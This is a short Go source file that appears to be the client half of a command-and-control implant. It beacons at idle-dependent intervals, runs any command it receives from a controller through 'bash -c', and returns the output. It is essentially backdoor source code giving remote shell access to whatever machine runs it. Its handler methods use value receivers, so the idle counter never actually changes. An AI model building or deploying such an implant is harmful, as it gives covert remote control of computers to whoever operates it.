package client

import (
	"fmt"
	"os/exec"
	"time"
)

const sleepIdleTime = 60
const interactiveIdleTime = 5
const maxInteractiveIdleCount = 12

type interactionHandler struct {
	idleCounter int
}

func newInteractionHandler() *interactionHandler {
	handler := interactionHandler{}
	handler.idleCounter = 0
	return &handler
}

func (m interactionHandler) handleCommand(decoded string, exitCallback func(), answerCallback func(string)) {
	switch decoded {
	case "idle":
		m.idleCounter++
		break
	case "ok":
		m.idleCounter = 0
		break
	case "exit":
		exitCallback()
	default:
		m.idleCounter = 0
		output := m.executeCommand(decoded)
		//todo: handle sending  big messages (like ifconfig)
		answerCallback(output)
	}
}

func (m interactionHandler) executeCommand(command string) string {
	cmd := exec.Command("bash", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println(err)
		return "command execution failed: " + err.Error()
	}
	return string(output)
}

func (m interactionHandler) sleep() {
	if m.idleCounter >= maxInteractiveIdleCount {
		time.Sleep(sleepIdleTime * time.Second)
	} else {
		time.Sleep(interactiveIdleTime * time.Second)
	}
}
